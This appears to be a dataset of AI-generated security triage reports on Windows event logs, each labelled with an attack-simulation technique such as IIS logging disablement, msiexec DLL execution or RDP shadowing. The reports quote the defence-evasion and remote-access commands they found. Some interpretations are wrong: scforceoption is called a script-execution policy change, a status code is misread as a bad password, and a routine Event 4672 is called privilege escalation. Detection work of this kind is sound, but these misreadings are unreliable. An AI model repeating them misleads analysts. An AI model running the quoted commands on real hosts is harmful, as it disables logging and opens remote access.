- **Connect-AzureAD & Remove-AzEventHub:** These commands interact with Azure resources. Executing these commands with empty credentials is unusual and potentially indicates a malicious intent if someone is trying to remove or disrupt Azure resources.

### Sysmon Logs Analysis

The Sysmon logs reflect various process creations mainly associated with `powershell.exe`, `conhost.exe`, `wevtutil.exe`, and the Microsoft Edge update processes.

#### Observations:
- **PowerShell Activity:** Initiating PowerShell from what appears to be an administrative account, `SERVER002\admin_test`, is potentially concerning but common if legitimate administrative tasks are being conducted. However, the context of the Azure-related PowerShell command with empty credentials heightens the suspicion.
- **`wevtutil.exe` Usage:** This executable is sometimes used by malware to clear event logs. Its multiple executions in a short time span warrant further investigation to rule out any cleaning of evidence.
- **Frequent `conhost.exe`:** While `conhost.exe` is a legitimate Windows process, its recurrence is usually part of typical command-line execution.

### Security Logs Analysis

The Security log entry indicates a membership change attempt or query (Event ID 4799) for the `Builtin\Users` group using the EdgeUpdate setup executable. This could be legitimate depending on the context (e.g., an Edge update), but further verification is recommended to ensure this is part of expected software updates.

### Assessment and Guidance

#### Assessment:
The activities identified in the logs show some potentially suspicious behavior:
- The PowerShell script attempting to connect to Azure and remove an EventHub using empty credentials is unusual. This might be a sign of an attempted unauthorized operation.
- Frequent usage of `wevtutil.exe` could suggest potential log tampering, which is often associated with malicious activities to hide tracks.

#### Guidance:
- **Further Investigation (Resolution: SUSPICIOUS):** Due to the suspicious nature of the PowerShell command and the `wevtutil.exe` executions, I recommend a focused investigation:
  - **Confirm the Intent and Origin:** Validate the legitimacy of the account `admin_test` and verify if there was a legitimate reason for the attempted PowerShell script.
  - **Inspect EventHub Activity:** Check Azure logs for any unauthorized changes or alerts regarding EventHub activities.
  - **Monitor and Analyze `wevtutil.exe` Invocations:** Ensure that the usage of `wevtutil.exe` was legitimate and not part of an attempt to tamper with log files.
  - **Verify Security and Update Procedures:** Confirm any update activities related to Microsoft Edge and ensure they were sanctioned and safe.

These steps will help determine if the behavior is indeed malicious or simply unusual yet benign."
MSBuild Bypass Using Inline Tasks (C#),"Upon reviewing the provided logs, the following observations are made in the Sysmon logs:

1. **PowerShell Execution**:
   - The execution of `powershell.exe` is logged but without any suspicious or unusual command-line arguments provided. It’s worth noting that PowerShell, being a powerful scripting environment, can be used maliciously, but here, no evidence of malicious script execution is visible from the logs provided. 

2. **Microsoft Edge Update Activity**:
   - There are multiple instances of `MicrosoftEdgeUpdate.exe` processes being executed, which is consistent with standard update operations for Microsoft Edge. 
   - The command lines, such as `/regsvc` and `/svc`, are typical for update processes, and the execution is under `NT AUTHORITY\SYSTEM`, indicating a legitimate update.

3. **Compilation with MSBuild.exe**:
   - Instances of `cmd.exe` launching `msbuild.exe` with a `.csproj` file from a temporary directory hint at compilation activities. While building projects isn't necessarily malicious, generating or compiling code in temporary directories can potentially be used for executing payloads, especially when tied with crafting a C# project to embed malicious code.
   - The usage of `csc.exe` (C# Compiler) in conjunction with `msbuild.exe` further defines the project’s compilation process, which by itself isn't inherently malicious unless the project contains harmful scripts or payloads.

4. **Wevtutil.exe Usage**:
   - Multiple instances of `wevtutil.exe` being executed might suggest log operations (querying, exporting, or clearing logs). If there are no administrative tasks scheduled or known to be executed during this period, such operations could be suspicious.

5. **Execution of Host and System Commands**:
   - Executions of `HOSTNAME.EXE` and `whoami.exe` are observed. These might indicate a reconnaissance phase in a malicious activity lifecycle; however, by themselves, these executions aren't conclusive evidence of a compromise.

6. **CMD Command executing MSBuild**:
   - The `cmd.exe` execution of `msbuild.exe` using files in a temp location might suggest an automated script, potentially for configuring software or artifacts. The directory pathname using `ADMIN_~1`, shorthand for a user's temporary files, should be cross-examined for unusual content.

Based on the analysis:
- **Suspicious**: The significant suspicious indicator is the use of MSBuild for potentially compiling projects in temp directories, which could be benign development activity or malicious if involving unexpected or unauthorized source code.
- **Benign**: The repeated `MicrosoftEdgeUpdate.exe` activities are expected behavior for routine updates.
- **Suspicious**: Wevtutil usage could either be an indication of administrative log leverage or potentially malicious log cleaning.

**Assessment**: The situation is assessed as **SUSPICIOUS** due to the use of MSBuild from temporary directories and the usage of wevtutil. These do not necessarily confirm malicious activity but warrant further investigation to determine the legitimacy of the processes and the contents of the compiled projects.

**Guidance on How to Proceed**:
1. Validate any legitimate activity surrounding the use of MSBuild to compile projects from temp directories.
2. Review policies and practices on PowerShell and CMD executions in the server environment.
3. Investigate the purpose and authorization of wevtutil executions.
4. Perform a threat hunt focusing on script-based threats, especially ones leveraging PowerShell or MSBuild.
5. Cross-reference with antivirus or endpoint protection logs to identify any correlated alerts.

Concentrate on any newly created or modified files resultant from these activities and check network activity logs incase any exfiltration attempts were made using the compiled projects."
Create ADS PowerShell,"Upon analyzing the provided Windows event logs, several activities can be identified as noteworthy:

### 1. PowerShell Activity:
The PowerShell EventID 600 entries are significant as they involve the creation and manipulation of Alternate Data Streams (ADS). The command utilized appears benign at first glance but includes operations that might not be typically executed by standard users. While not inherently malicious, this type of behavior warrants further review to confirm the intention behind these commands.

### 2. Sysmon Observations:
A considerable number of executions of Microsoft EdgeUpdate processes were observed. The repeated spawning and termination of EdgeUpdate processes could be part of a legitimate update cycle. However, substantial activity focusing on updates and registers could also denote an attempt to hide or leverage legitimate software for malicious purposes.

### 3. Security and Logon Events:
The security logs mainly feature successful logon events using SYSTEM privileges (EventID 4624 and 4672), which suggest standard internal system operations or automated tasks involving service accounts. There is a notable absence of logon events that directly indicate a brute force or unauthorized access attempt.

### 4. Indicators of Privilege and Behavior:
The security logs show privilege assignments typical for high-integrity operations (e.g., SeDebugPrivilege, SeTcbPrivilege) carried out by the SYSTEM user. These privileges are standard for local service operations but should still be monitored to prevent misuse.

### 5. Usage of 'whoami' and 'hostname':
The observed execution of `whoami.exe` and `hostname.exe` under a high integrity level suggests the retrieval of user and system information. This action could be seen in malicious contexts to understand current user permissions and system details, but also may occur during administrative tasks or scripts.

### Assessment:
- **PowerShell commands related to ADS** are uncommon in regular user operations and can often signify post-exploitation activities or data hiding techniques. This activity deserves further investigation to determine its context and purpose.
- **Multiple EdgeUpdate processes** could indicate either regular update activities or more nefarious actions if leveraged improperly.
- **High integrity operations and privilege usage** suggest that administrative actions are being executed properly, but should be continually audited.

### Resolution:
Based on the investigation:
- **Resolution:** **SUSPICIOUS** 
- **Reason:** Presence of ADS manipulation via PowerShell and substantial EdgeUpdate process activities warrant further investigation for potential malicious use or misconfigurations.

### Guidance:
- Conduct a detailed review of the PowerShell scripts or tasks that led to the ADS-related events to ensure they are authorized.
- Review the configuration and operational logs for Microsoft Edge Updates to ensure no unauthorized modifications or integrity issues.
- Monitor for any further signs of privilege escalation attempts or unusual administrative actions to preemptively mitigate risks.

Initiate discussions with system administrators to validate the legitimacy of these activities and enhance monitoring protocols as necessary to capture similar occurrences in future log analysis."
Invoke CHM Simulate Double click,"Upon analysis of the provided logs, several events and behaviors can be observed that warrant deeper investigation and further scrutiny.

1. **Abnormal PowerShell Usage:**
   - Multiple instances of `powershell.exe` are observed, executed by `admin_test` and `NT AUTHORITY\SYSTEM` with high integrity level. Notably, the use of PowerShell scripting, such as `Invoke-ATHCompiledHelp` and other scripts that read Windows system paths (`C:\\Windows\\System32\\HOSTNAME.EXE` and `C:\\Windows\\System32\\whoami.exe`), suggest attempts to manipulate or gather information, which are often associated with suspicious activity.
   - The command line observed with one of the PowerShell processes indicates an execution with a script involving checking for installation paths and printing results: `powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $Infs = Get-Item -Path ($env:WinDir + '\\inf\\*.inf'); foreach ($Inf in $Infs) { $Data = Get-Content $Inf.FullName; if ($Data -match '\\[defaultinstall.nt(amd64|arm|arm64|x86)\\]') { $Res = 1; break; } } Write-Host 'Final result:', $Res;`. Such command usage can be useful for potentially malicious reconnaissance activities.
   
2. **Execution of Utilities:**
   - Frequent execution of `wevtutil.exe` and `conhost.exe` in close succession could potentially indicate event log manipulation or an attempt to interact with system services without clear justification or expected user activity pattern observed.
   
3. **Processes Started under Admin Context:**
   - While these processes were initiated under the context of `SERVER002\admin_test`, there is no clear indication of why these would be run systematically in such rapid succession without a corresponding benign administrative task. This may suggest inappropriate or unauthorized access.

4. **Lack of Contextual Information:**
   - Although we see PowerShell and Windows-intrinsic tools being used, there is not enough correlating context such as user activities, active tasks, or specific administrative actions reported during this period that explains these operations. Normally benign tools used in a nonstandard way could be indicative of lateral movement or data collection attempts.

Based on the events logged, especially around PowerShell execution with administrative privileges and use of system tooling that appears unnecessary outside of expected scripts or maintenance activities, this behavior is noted to be **SUSPICIOUS**.

**Resolution Recommendation: SUSPICIOUS**

Further investigation is needed:
- **Network Analysis and Monitoring**: Check recent network activity and interactions to detect any unusual data transfers.
- **File Integrity Checks**: Perform a thorough file integrity check and auditing of system binaries and scripts.
- **User Activity Review**: Review `SERVER002\admin_test` account activity to correlate usage patterns and verify against scheduled jobs or tasks.
- **Enhanced Security Logging**: Enable deeper Sysmon and PowerShell logging to identify potential live queries or test for persistence mechanisms.

The risk here could potentially be a precursor to data breach or persistent threat if left unmanaged, caution and deeper analysis is warranted."
Delete an entire folder - Windows PowerShell,"After analyzing the provided logs, here's a detailed assessment focusing on potentially suspicious or anomalous activities:

### Analysis

1. **Process Execution Patterns**:
   - **Microsoft Edge Update (MicrosoftEdgeUpdate.exe)**: A significant portion of the logs consists of entries related to the Microsoft Edge Update. The processes with this executable are consistently tied to the user `NT AUTHORITY\SYSTEM`, which is typical for automatic updates. This activity appears legitimate as it involves typical update operations and shows a consistent pattern with expected parent-child process relationships.
   - **Windows PowerShell Execution**:
     - The execution of `PowerShell.exe` with a command to remove items from a temporary folder is observed:
       - **Command**: `Remove-Item -Path $env:TEMP\deleteme_folder_data.004 -Recurse`
       - **User**: `SERVER002\admin_test` 

     The PowerShell activity might seem suspicious due to the recursive deletion of potentially important data. Powershell activities are commonly leveraged in attacks for lateral movement or data manipulation; however, this could also be an administrator performing housekeeping tasks. The user `admin_test` conducting such an activity should be verified to ensure tasks being performed are sanctioned and expected.

2. **Processes Run by Admin Users**:
   - A series of processes (`wevtutil.exe`, `conhost.exe`, and `whoami.exe`) are executed by the user `SERVER002\admin_test`. The use of `wevtutil.exe` could be suspicious if being used to tamper with event logs, such as clearing logs to cover tracks, but there is no direct evidence of this occurring in the logs.
   - The `whoami.exe` execution by the same user could be normal to check user privileges but should be contextually verified.

3. **Wevtutil.exe Execution**:
   - The execution of `wevtutil.exe`, a tool used to manage event logs, might suggest log clearing attempts if combined with argumentative commands indicating such. However, this is not immediately evidenced in the data provided.

4. **Edge Installation**:
   - The frequent installation-related activity for Microsoft Edge Update, including setup executions and temporary file handling, matches expected processes for an application update. There is no immediate indication pointing toward a malicious payload drop or execution.

### Summary

Based on the logs presented, there is no direct evidence of outright malicious activity. The actions observed could be reasonably explained by legitimate administrative tasks or regular system updates.

### Potential Risks
- PowerShell usage should be verified with IT policies to ensure it aligns with expected usage, especially given its powerful capabilities often exploited in malicious activities.
- The execution of `wevtutil.exe` should be reviewed further to rule out any log tampering intentions, although no clear indication of log tampering was observed.

### Resolution
- **SUSPICIOUS**: Logs contain activities that necessitate further verification, particularly around the PowerShell activities and use of administrative tools like `wevtutil.exe`.

### Guidance
1. **Verify with IT Team**: Ensure the PowerShell commands and activities align with internal policies and expected administrator tasks.
2. **Monitor User Activity**: Check if the user `SERVER002\admin_test` has a history of performing similar tasks and whether these were authorized.
3. **Review Wevtutil Usage**: Double-check command arguments for any potential log management or tampering actions.

Consider conducting further investigation specifically around the PowerShell and `wevtutil.exe` usage to confirm benign intent."
Read volume boot sector via DOS device path (PowerShell),"Upon examining the provided logs, several observations can be made regarding the activities recorded:

### System Log
- The events primarily detail a Security Intelligence Update for Microsoft Defender Antivirus. These entries suggest a routine update to antivirus definitions, a benign and expected activity for ensuring system security.

### Application Log
- The events include a notice of the ""edgeupdate"" service being stopped and Windows Defender being in an active state. These entries do not indicate any immediate threats, as stopping and starting of services can occur for various legitimate reasons, including system updates or configuration changes.

### Security Log
- The logs show repeated attempts to read credential types resulting in a return code `3221226021`, which translates to ""The user name or password is incorrect."" These entries could suggest incorrect credential access attempts, potentially due to misconfiguration or an unauthorized attempt to access system credentials. However, given the context and absence of successful credential compromise, these remain suspicious but not definitively malicious.

### Windows PowerShell Log
- Multiple instances of PowerShell execution with a command that is accessing system-level files (`\\.\C:`). This specific command structure can be associated with attempts to gather information or explore file contents which is atypical for benign tasks and suggests potential unauthorized data access or reconnaissance.

### Sysmon Log
- The use of various Windows utilities (`powershell.exe`, `wevtutil.exe`, `whoami.exe`, etc.) is logged. Specific attention is required for PowerShell and wevtutil usage because these tools can be employed in both administrative setups and malicious activities. The invocation of PowerShell with a non-standard command suggests it could be exploited for reconnaissance or data exfiltration.

### Assessment
- The consistent and unusual pattern of PowerShell execution and the access attempts with incorrect credentials could indicate an attempt at unauthorized access or reconnaissance effort within the host.

Based on the cumulative context, while routine update activities are noted, there are several instances of unexpected behavior that merit further investigation due to their potential to signify reconnaissance or attempted credential access.

### Conclusion
- **Resolution: SUSPICIOUS** - The logs contain activities, particularly involving PowerShell usage and repeated credential access failures, that warrant further investigation to rule out potential malicious behavior. It's recommended to:
  - Validate the legitimacy of PowerShell scripts executed and examine if they are part of regular administrative tasks.
  - Investigate any user or process potentially linked with the access attempts to ensure no unauthorized configuration or actions have taken place.
  - Enhancing monitoring on the system for any future occurrences of such events or anomalies."
Delete Windows Defender Scheduled Tasks,"Based on the analysis of the provided log entries:

1. **Time Changes:**
   - The logs show repeated time changes with Event IDs 24 and 4616 in the System and Security logs. This could potentially indicate suspicious activity, especially if it involves altering system logs or hindering audit processes. However, in this context, the process responsible is `svchost.exe`, which is a legitimate Windows service host process.
   
2. **Process Execution:**
   - *Sysmon Logs* show frequent execution of command-line tools such as `cmd.exe`, `schtasks.exe`, `whoami.exe`, and `wevtutil.exe`. These tools are often used legitimately; however, their combined use and specific command lines can raise suspicions:
      - The use of `schtasks.exe` to query Windows Defender tasks appears normal but is immediately followed by another set of commands to delete these tasks. This may suggest an attempt to disable or manipulate security-related scheduled tasks, which is a red flag.
      - The combination of querying and deleting tasks could be indicative of an adversary gaining a foothold in a system and attempting to maintain persistence by disabling security tools.
      - Execution of `whoami.exe` and `hostname.exe` could be indicative of reconnaissance activities by an attacker to determine the current user context and system details.

3. **Integrity Level and User Context:**
   - The processes are running with high integrity levels under the `admin_test` user, which indicates elevated permissions. High integrity level processes can make significant changes to the system.
   - The user context for many of these activities is `SERVER002\admin_test`, potentially pointing to either an admin-related script running or misuse of admin credentials.

4. **Use of Utilities:**
   - `wevtutil.exe` is used to manage event logs, which might be leveraged to clear logs or export them. The presence of this process in conjunction with potentially disabling Windows Defender tasks is suspicious.

**Conclusion:**
- **Resolution: SUSPICIOUS**

**Explanation:**
- While the involved processes are legitimate system binaries, the sequence of events implies potentially malicious intent. This includes querying and then deleting security-related tasks, and the use of system tools that are commonly seen in attempts of privilege escalation or system reconnaissance.
  
**Guidance on How to Proceed:**
1. **Alert and Investigate Further:**
   - Conduct a deeper investigation into the `admin_test` account activity to ensure its actions were authorized.
   - Review any additional logs not provided that pertain to network connections, file modifications, registry changes, and user authentication to gain a comprehensive view of system activities around the timeframe these logs were generated.

2. **Monitor and Audit:**
   - Implement monitoring of any future modifications to scheduled tasks, especially those related to security applications, and changes to system time.
   - Ensure auditing is enabled, specifically focusing on log access, modifications, and deletions.

3. **Ensure Security Tools are Active:**
   - Verify the reactivation of any disabled Windows Defender tasks and updating security policies to prevent unauthorized modifications in the future.

4. **Assess and Remediate:**
   - Run integrity checks on system files and security configurations.
   - If unauthorized changes are confirmed, consider isolating the machine for forensic investigation to identify the scope of potential compromise."
Msiexec.exe - Execute the DllUnregisterServer function of a DLL,"Upon reviewing the provided Windows event logs, here is a detailed analysis:

### Overview of the Logs
The logs provided comprise several types of entries from different sources, including:
- PowerShell logs (which are empty in the provided data)
- Application logs
- Sysmon logs

The Sysmon logs capture various process creations, which are insightful in identifying potential malicious activity by examining process execution patterns and command-line arguments.

### Application Log Analysis
The application logs show events related to the `edgeupdate` service. This service is associated with Microsoft Edge updates. The entries largely indicate the stopping of the service:
1. TimeCreated: `2024-10-26 15:10:41.845`
2. TimeCreated: `2024-10-26 15:10:43.323`

### Sysmon Log Analysis
The Sysmon logs provide detailed events regarding processes:
- Multiple executions of `powershell.exe`, `conhost.exe`, `wevtutil.exe`, and Microsoft Edge update processes (`MicrosoftEdgeUpdate.exe`).
- A significant event is execution of `cmd.exe` with a suspicious command line containing `msiexec.exe` and `.dll` file path:
  ```
  ""cmd.exe"" /c c:\windows\system32\msiexec.exe /z ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.007\bin\MSIRunner.dll""
  ```
  **Reason for Suspicion:**  
  - The use of `msiexec.exe` with a DLL is unconventional in typical systems' functions and could indicate an attempt to execute or install something suspicious.
  - The presence of `MSIRunner.dll` in a temporary directory can be perceived as potentially malicious behavior, as TMP folders are often leveraged for staging files by adversaries.
- Executions of `whoami.exe` and `hostname.exe` by `SERVER002\admin_test` may indicate reconnaissance activities, but by themselves, they do not conclusively imply malicious activity in isolation.
- Numerous events pertaining to Microsoft Edge Update processes, often running under `NT AUTHORITY\SYSTEM` which can seem suspicious due to elevated privileges, but this aligns with normal operation when the Edge browser updates itself.

### Conclusion
1. **BENIGN Activities:**
   - Most `MicrosoftEdgeUpdate.exe` processes appear to be legitimate update activities by the browser.
   - Processes like `whoami.exe` and `hostname.exe`, while potentially reconnaissance, can commonly occur during administration tasks.

2. **SUSPICIOUS Activity:**
   - The execution of `cmd.exe` utilizing `msiexec.exe` with a DLL located in a user's temporary path is suspicious and requires further investigation. This specific event is a strong lead that indicates potential malicious behavior or preparation for such activity. This is particularly since `MSIRunner.dll` appears during this process, which could imply DLL side-loading or execution of unauthorized code.
   
### Final Assessment: **SUSPICIOUS**
- The logs contain a combination of benign activities and one notably suspicious command line involving `msiexec.exe`. Further examination of `MSIRunner.dll`, its origin, and its intended actions is recommended. Additionally, checking for anomalies or unauthorized accesses on Server002 and ensuring its security measures are properly configured would be prudent.
- Consider increasing monitoring of this host and potentially conducting a deeper forensic analysis to ensure no compromise has occurred.
"
Allow Simultaneous Download Registry,"### Analysis of Windows Event Logs

Upon analyzing the provided logs, several key observations and evaluations can be made:

#### **Sysmon Logs:**
1. **Process Creation (Event ID 1):**
   - Multiple instances of common Windows utilities and legitimate processes like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe` are logged. These are typical system tools used to manage and interact with the Windows operating system.
   - `cmd.exe` is seen executing a registry command to modify `MaxConnectionsPerServer` and `MaxConnectionsPer1_0Server` settings for Internet Settings. These modifications themselves are not inherently malicious but are often adjusted for enhancing performance or HTTP connection limitations in a benign context.
   - The `cmd.exe` commands seem to execute without user interaction despite having a high integrity level, which could imply automation or scripting by a legitimate user or automated task.

2. **Process Termination (Event ID 5):**
   - The sudden, consecutive execution of multiple `wevtutil.exe` and `conhost.exe` instances is noted. This pattern may imply scripted or automatic log/query operations, potentially for system administration tasks.

3. **Network Service and System Integrity:**
   - `svchost.exe`, `sppsvc.exe`, and `TiWorker.exe` are processes associated with system services and Windows updates. The involvement of `NT AUTHORITY\NETWORK SERVICE` and `NT AUTHORITY\SYSTEM` provides them with a higher trust level, suggesting these events are part of normal system operations like updates or licensing checks.

#### **Application and Other Logs:**
- **Software Protection Platform Service:**
  - The `Software Protection Platform Service` entry indicates standard operations related to Windows licensing and validation.

### Assessment of Potential Threats or Risks

- The execution of common utilities (`whoami.exe`, `hostname.exe`, etc.) without unusual command line arguments suggests typical administrative behavior rather than malicious actions.
- The `cmd.exe` registry modification commands could be viewed as suspicious depending on the organization's policy and context but are not conclusive evidence of compromise because these commands are sometimes run by legitimate administrative scripts or configuration management tools.
- No evidence of privilege escalation or use of suspicious command-line arguments that suggest malicious intent was found.

### Resolution

Based on the log analysis and context provided, I conclude the following resolution:

**BENIGN:**

The observed activities do not indicate malicious behavior within these logs. The executions and commands seem related to typical administrative actions or system maintenance operations. However, it's advisable to verify these actions against organization policy or recent administrative activities for completeness, especially concerning the registry modifications. If these actions align with known scheduled tasks or maintenance windows, further investigation might not be necessary. If any doubt remains, consulting with the responsible system administrator or digging deeper into the context of these actions would be prudent to confirm benign intent."
Disable Windows IIS HTTP Logging via PowerShell,"Upon reviewing the provided logs, several aspects warrant further investigation to understand potential security implications:

**Suspicious or Anomalous Behavior:**

1. **Time Change Events:**
   - Multiple events indicate changes in system time in quick succession (Security Event ID 4616 and System Event ID 1 by the svchost.exe process). Simultaneous time change events might suggest manipulation attempts that could disrupt event logging.

2. **PowerShell Activity:**
   - There is a notable PowerShell command that modifies IIS configurations to stop logging (`set-WebConfigurationProperty -PSPath ""IIS:\Sites\Default Web Site\"" -filter ""system.webServer/httpLogging"" -name dontLog -value $true`). Disabling logging can be an indicator of someone attempting to obscure further malicious actions.

3. **Edge Update Process:**
   - Numerous executions of `MicrosoftEdgeUpdate.exe` with different command-line arguments, indicating a potential automated update/process installation. While it could be legitimate update activity, if unexplained, such repeated and varied executions might indicate an abuse of legitimate processes.

**Potential Indicators of Malicious Activity or Compromise:**

1. **PowerShell Command to Disable Logging:**
   - It's critical to determine if this PowerShell command was authorized. Disabling HTTP logging within IIS through PowerShell can indicate an attempt to hide unwanted activity on the server.

2. **Repeated Edge Update Executions:**
   - The Edge Update activities leading to various outros and MicrosoftEdgeUpdateSetup executions need validation for legitimacy. Threat actors sometimes exploit legitimate software updater mechanisms to introduce malicious payloads.

3. **Service Stops:**
   - The Application log contains records of stopped services related to `edgeupdate`. While not inherently suspicious, it is necessary to verify that these are routine and expected, especially given the timing around the investigated activities.

**Assessment and Guidance:**

Resolution: **SUSPICIOUS**

Given these findings and the potential for misuse of administrative tools and settings (e.g., PowerShell and Edge updates), more comprehensive investigation is required:

1. **Investigate PowerShell Activity:**
   - Verify the origin and intent behind the execution of PowerShell commands disabling IIS logging. This investigation should involve confirming the responsible user's intent and authorization.

2. **Review Edge Update Executions:**
   - Confirm whether the observed Edge Update processes, indicated by both Sysmon logs and application behavior, match expected update patterns or if they indicate unsanctioned usage.

3. **Validate Time Change Events:**
   - Ensure that the system time change, particularly the quick succession of changes, was a result of legitimate administrative activity, without any malicious interference.

4. **Monitoring and Mitigation:**
   - Introduce or reinforce monitoring to alert on future unapproved PowerShell commands, especially involving configuration changes or logging disablements.

5. **Assess System Integrity:**
   - Consider a more thorough security check of the system to detect any indicators of compromise that might not be fully evident in these logs but could correlate to this suspicious behavior. 

These findings warrant an escalated examination to verify or refute potential malicious activity, ensuring the system’s integrity and security posture are uncompromised."
Enforce Smart Card Authentication Through Registry,"Based on the provided logs and the context given, let's break down the analysis focusing on identifying any suspicious activities:

1. **Process Execution and Command-Line Usage:**
   - **Sysmon Logs:**
     - The repeated execution of `MicrosoftEdgeUpdate.exe` from a `Temp` directory could be malicious. While Edge update processes from legitimate locations are typically benign, execution from temporary directories, especially under `NT AUTHORITY\SYSTEM`, can be suspicious due to potential misuse for privilege escalation or unauthorized updates.
     - The sequence of processes run by the user `SERVER002\admin_test`, including `wevtutil.exe`, `conhost.exe`, and command-line tools like `cmd.exe` and `reg.exe`, raises a red flag. Particularly, the command executing `reg.exe` to modify registry settings without any clear administrative task purpose is concerning. This command:
       ```
       reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v scforceoption /t REG_DWORD /d 1 /f
       ```
       indicates a forced script execution policy change which is often used to bypass user security settings.

   - **Command-Line Argument Patterns:**
     - The execution of `whoami.exe`, `conhost.exe`, and `cmd.exe` along with `registry` manipulations in quick succession can be an indicator of scripted or automated actions typical in penetration testing, security research, or malicious activity.

2. **Time Modification Events:**
   - There are multiple time change logs within a very short period from different services (Kernel-General, Time-Service), potentially indicative of attempts to hide tracks or confuse log timelines, but also possible due to system-induced corrections.

3. **User Behavior:**
   - The user `SERVER002\admin_test` repeatedly appears in logs performing actions that might be legitimate administrative tasks but when combined with other suspicious activities, could suggest malicious intent.

4. **Registry Modifications:**
   - The registry change to add `scforceoption` under the System policies is suspicious, potentially indicating a policy manipulation used to force certain scripts or executions that bypass user consent.

**Assessment:**
- **Suspicious Behavior Detected:**
  - A mix of potentially benign actions (such as `whoami.exe`) and suspicious registry modifications and file executions in unusual sequences and directories raise concerns.
  - The use of `Temp` directory for a software update executable is suspicious unless specifically looking at a staged or beta testing setup.

**Resolution: SUSPICIOUS**
- The activities contained within these logs warrant further investigation. While there is no direct evidence of malicious exploitation, several actions are outside typical expected behaviors for a standard user even with administrative privileges.
- Next Steps:
  - Conduct a comprehensive file integrity check on affected programs and directories.
  - Monitor network traffic for any external data exfiltration or communication anomalies.
  - Verify user account activities and permissions, especially focusing on `SERVER002\admin_test`.
  - Correlate with other system logs for irregular logins, failed attempts, or unauthorized access from external IPs.
  - Investigate the context around the time change events and corroborate them with administrator logs to ensure they were not maliciously altered.
"
Decompile Local CHM File,"### Analysis of Sysmon Log Entries

Upon reviewing the Sysmon log entries, several points of interest were identified:

1. **PowerShell Execution (EventID: 17962):**
   - The `powershell.exe` executable was run by the user `SERVER002\admin_test`. This can be a common vector used in attacks if scripts or commands are run that deviate from normal operations. However, no specific command-line arguments or scripts are detailed in this log entry which could indicate malicious intent.

2. **Frequent Execution of System Processes:**
   - Processes such as `conhost.exe`, `wevtutil.exe`, and `whoami.exe` are executed frequently by the same user. While these are legitimate Windows processes, their execution in rapid succession could be associated with attempts to manipulate system settings or capture system information.

3. **Suspicious Command Execution via CMD (EventID: 17992):**
   - The log event shows that `cmd.exe` was launched with a command to `hh.exe -decompile...` which extracts contents of a `.chm` file. Such actions could suggest attempts to execute malicious scripts embedded in help files. This is concerning and should be further scrutinized.

4. **Edge Update Activity:**
   - There are multiple instances of `MicrosoftEdgeUpdate.exe` running, which appear to be part of a legitimate update cycle. The command lines and paths appear consistent with normal Windows operation for updating Microsoft Edge.

5. **Files from Temp Directories (EventID: 18003):**
   - The usage of `Temp` directories by Microsoft Edge Update images and temporary execution paths may look odd but can be explained by the update process itself, which often makes use of temporary directories.

### Application Log Entries

- The application logs from `edgeupdate` and `SecurityCenter` mostly show service stopping events and state confirmations like ""SECURITY_PRODUCT_STATE_ON"", indicating that Windows Defender is active. These do not indicate malicious activity by themselves.

### Conclusion and Recommendations

- **Resolution: SUSPICIOUS**
   - While many logged events may align with legitimate activities or updates, there are several potentially suspicious activities, chiefly the `hh.exe` decompile from a CHM file which could imply an attempt to deliver or execute a payload using Microsoft's HTML Help as a vector. This warrants further investigation.

### Recommendations:

1. **Further Investigation:**
   - Investigate the `hh.exe -decompile...` command execution. This should include reviewing available .chm files for any suspicious content and correlating this with potential downloads or other vectors leading up to this.

2. **User Verification:**
   - Check the account activity of `SERVER002\admin_test` for any anomalies or deviations from typical usage patterns, possibly cross-referencing these times with network logs or external communications that might signal unauthorized access.

3. **System Monitoring:**
   - Intensify real-time monitoring of the system for further unusual activities, especially around anomalous command-line usage, unauthorized account logins, or high-risk executable launches.

4. **Ensure Updates:**
   - Confirm that the security system, including endpoint protection tools, is fully up-to-date to immediately block any known threats.

5. **Logs Review:**
   - Regular manual audit of logs, especially focusing on PowerShell script blocks and any other executed command-line instructions that may not follow the standard operation narratives.

Taking these steps should help to determine if the observed activity was indeed malicious or potentially mischievous, or if it represented anomalous yet non-threatening behavior."
Setting Shadow key in Registry for RDP Shadowing,"Upon analyzing the provided Windows event logs, several entries suggest potentially suspicious activity involving privilege escalation and execution of scripts that may modify system configurations. Below is a detailed breakdown of the findings:

### Suspicious Behavior:
1. **Security Log - Event ID 4672:**
   - **Privilege Escalation:** A user `admin_test` was granted a list of high-level privileges, including `SeDebugPrivilege`, `SeBackupPrivilege`, `SeLoadDriverPrivilege`, and others. These privileges allow significant control over the system and could be exploited for malicious purposes.

2. **Sysmon Logs - PowerShell Execution:**
   - Multiple entries involve the execution of PowerShell scripts with elevated privileges. One notable script attempts to enable a Windows Firewall rule for ""Remote Desktop - Shadow (TCP-In)"" and modifies registry settings related to `Terminal Services`. The PowerShell command includes:
     ```powershell
     ""powershell.exe"" & {$s= New-CimSession -Computername localhost -SessionOption (New-CimSessionOption -Protocol Dcom), Get-CimInstance -Namespace ROOT\StandardCimv2 -ClassName MSFT_NetFirewallRule -Filter 'DisplayName=\""Remote Desktop - Shadow (TCP-In)\""' -CimSession $s | Invoke-CimMethod -MethodName Enable, Invoke-CimMethod -ClassName StdRegProv -MethodName SetDWORDValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName=\""Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\""; sValueName=\""shadow\""; uValue=[uint32]2} -CimSession $s}""
     ```

3. **Frequent Use of `wevtutil.exe` and `conhost.exe`:**
   - While the use of these utilities (`wevtutil.exe`, `conhost.exe`) can be legitimate, frequent or automated executions immediately after privilege escalation could signify attempts to manipulate event logs or console outputs, respectively, possibly indicating cover-up or troubleshooting actions executed by an unauthorized user.

### Analysis and Conclusion:
- The combination of actions (elevated privileges, suspicious PowerShell script execution, and consistent use of system utilities) points to activity that is out of the ordinary and needs immediate attention.
- The PowerShell commands specifically modify firewall rules and registry settings in a manner typically associated with attempts to facilitate or obscure unauthorized remote access or control.

### Resolution:
- **Resolution:** SUSPICIOUS
- **Recommended Actions:**
  * **Immediate Review:** Conduct a detailed review of all actions by the user `admin_test` and verify if these privileges and operations were part of any authorized administrative task.
  * **Enhanced Monitoring:** Increase monitoring of PowerShell usage and privilege changes on the system to identify any further suspicious behavior.
  * **Incident Response:** According to your organization's policy, consider activating your incident response team to further investigate and contain any potential threats.
  * **Log Correlation:** Review logs from other systems to cross-reference activities for similar patterns that may indicate coordinated efforts.
  * **User Verification:** Confirm the legitimacy of the user `admin_test` and whether their account has been compromised.
"
